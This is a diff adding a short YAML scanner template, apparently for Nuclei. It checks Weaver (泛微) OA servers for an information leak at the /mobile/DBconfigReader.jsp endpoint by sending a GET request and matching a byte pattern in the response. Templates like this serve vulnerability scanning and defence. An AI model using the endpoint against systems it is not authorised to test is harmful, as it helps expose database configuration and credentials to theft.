@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-mobile-dbconfig-reader-info-leak
+info:
+  name: "泛微 OA Mobile DBconfigReader 信息泄露"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Weaver OA
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/DBconfigReader.jsp"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "\\r\\n\\r\\n\\r\\n\\r\\n\\x8a\\xd2\\xf1\\xd4\\x98~p"
